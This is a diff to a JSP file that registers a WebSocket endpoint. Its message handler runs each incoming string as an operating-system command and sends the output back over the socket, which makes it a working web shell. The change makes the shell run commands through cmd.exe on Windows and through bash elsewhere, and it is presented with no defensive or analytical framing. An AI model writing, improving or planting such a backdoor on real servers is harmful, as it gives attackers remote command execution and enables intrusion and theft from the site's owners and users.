@@ -8,26 +8,26 @@
         public void onOpen(Session session, EndpointConfig config) {
             session.addMessageHandler(new MessageHandler.Partial<String>() {
                 @Override
-                public void onMessage(String s, boolean ccc) {
+                public void onMessage(String s, boolean bl) {
                     if (s !=null){
-                        String out;
                         try {
-                            Runtime rt = Runtime.getRuntime();
-                            Process p = rt.exec(s);
-                            InputStream inputStream = p.getInputStream();
-                            BufferedReader b = new BufferedReader(new InputStreamReader(inputStream));
-                            StringBuilder all = new StringBuilder();
-                            String line;
-                            while ((line = b.readLine()) != null) {
-                                all.append(line).append("\n");
+                            boolean isWindows = System.getProperty("os.name").toLowerCase().startsWith("windows");
+                            Process p;
+                            if (isWindows) {
+                                p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", s});
+                            } else {
+                                p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", s});
                             }
-                            out = all.toString();
+                            InputStream in = p.getInputStream();
+                            int c;
+                            StringBuilder all = new StringBuilder();
+                            while ((c = in.read()) != -1) {
+                                all.append((char)c);
+                            }
+                            in.close();
+                            p.waitFor();
+                            session.getBasicRemote().sendText(all.toString());
                         } catch (Exception e) {
-                            out = e.toString();
-                        }
-                        try {
-                            session.getBasicRemote().sendText(out);
-                        } catch (IOException e) {
                             e.printStackTrace();
                         }
                     }
@@ -43,6 +43,6 @@
     try {
         container.addEndpoint(configEndpoint);
     } catch (DeploymentException e) {
-        e.printStackTrace();
+        out.println(e.toString());
     }
 %>
